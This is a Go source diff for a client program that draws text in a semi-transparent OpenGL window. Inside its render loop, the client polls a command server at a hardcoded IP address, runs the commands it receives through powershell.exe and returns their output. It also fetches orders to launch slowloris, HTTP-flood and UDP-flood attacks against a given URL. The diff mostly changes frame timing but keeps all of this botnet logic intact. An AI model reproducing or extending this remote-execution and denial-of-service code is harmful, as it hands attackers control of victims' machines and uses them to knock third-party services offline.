@@ -57,7 +57,7 @@ func init() {
 }
 
 func main() {
-	c, err := consumer.Init("localhost:8000")
+	c, err := consumer.Init("172.17.47.166:8000")
 	if err != nil {
 		log.Fatalln(err)
 	}
@@ -118,7 +118,7 @@ func main() {
 	}()
 
 	window.MakeContextCurrent()
-	glfw.SwapInterval(1)
+	glfw.SwapInterval(0)
 
 	if err := gl.Init(); err != nil {
 		panic(err)
@@ -145,47 +145,60 @@ func main() {
 	window.SetOpacity(0.9)
 	window.SetCloseCallback(CloseCallback)
 
+	lastFrameTime := 0.0
+	fpslimit := 1.0 / 240.0
+
 	for !window.ShouldClose() {
-		text, should_update, err := GetOnScreenText(receiver, pid)
-		if err != nil {
-			log.Println(err)
-		}
-		Draw(font, mode, pid, text, window, should_update)
+		now := glfw.GetTime()
 
-		d, err := c.GetCommand(ctx, &pb.ClientDataRequest{ClientId: pid})
-		go func() {
+		if (now - lastFrameTime) >= fpslimit {
+			lastFrameTime = now
+
+			text, should_update, err := GetOnScreenText(receiver, pid)
 			if err != nil {
-				log.Println("Error during GetCommand:", err)
+				log.Println(err)
 			}
+			Draw(font, mode, pid, text, window, should_update)
 
-			var out []byte
-			if d.GetShouldExec() {
-				out, err = exec.Command("powershell.exe", "-c", d.Command).CombinedOutput()
-				c.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
+			d, err := c.GetCommand(ctx, &pb.ClientDataRequest{ClientId: pid})
+			go func() {
 				if err != nil {
-					log.Println("Error during exec", err)
+					log.Println("Error during GetCommand:", err)
 				}
-			}
-		}()
 
-		flood, _ := c.GetFlood(ctx, &pb.Void{})
-		go func() {
-			if flood.GetShouldFlood() {
-				switch flood.FloodType {
-				case 0:
-					slowloris.SlowlorisUrl(flood.GetUrl(), flood.GetNumThreads(), time.Minute,
-						time.Duration(flood.GetLimit())*time.Second)
-				case 1:
-					httpflood.FloodUrl(flood.GetUrl(), time.Duration(flood.GetLimit())*time.Second,
-						flood.GetNumThreads())
-				case 2:
-					//
-				case 3:
-					udpflood.UdpFloodUrl(flood.GetUrl(), flood.GetNumThreads(),
-						time.Duration(flood.GetLimit())*time.Second)
+				var out []byte
+				if d.GetShouldExec() {
+					out, err = exec.Command("powershell.exe", "-c", d.Command).CombinedOutput()
+					c.SetCommandOutput(ctx, &pb.ClientExecOutput{Id: &pb.ClientDataRequest{ClientId: pid}, Output: out})
+					if err != nil {
+						log.Println("Error during exec", err)
+					}
 				}
-			}
-		}()
+			}()
+
+			flood, _ := c.GetFlood(ctx, &pb.Void{})
+			go func() {
+				if flood.GetShouldFlood() {
+					switch flood.FloodType {
+					case 0:
+						slowloris.SlowlorisUrl(flood.GetUrl(), flood.GetNumThreads(), time.Nanosecond,
+							time.Duration(flood.GetLimit())*time.Second)
+					case 1:
+						httpflood.FloodUrl(flood.GetUrl(), time.Duration(flood.GetLimit())*time.Second,
+							flood.GetNumThreads())
+					case 2:
+						//
+					case 3:
+						udpflood.UdpFloodUrl(flood.GetUrl(), flood.GetNumThreads(),
+							time.Duration(flood.GetLimit())*time.Second)
+					}
+				}
+			}()
+
+			window.SwapBuffers()
+			glfw.WaitEventsTimeout((1 / fpslimit) / 1000)
+		}
+
 	}
 
 	receiver.CloseSend()
@@ -245,9 +258,6 @@ func Draw(font *glfont.Font, mode *glfw.VidMode, pid string, text string, window
 			font.Printf(float32(mode.Width)/2-font.Width(1.0, line)/2, float32(mode.Height)/3+float32(idx*55), 1.0, line)
 		}
 	}
-
-	window.SwapBuffers()
-	glfw.PollEvents()
 }
 
 func CloseCallback(w *glfw.Window) {
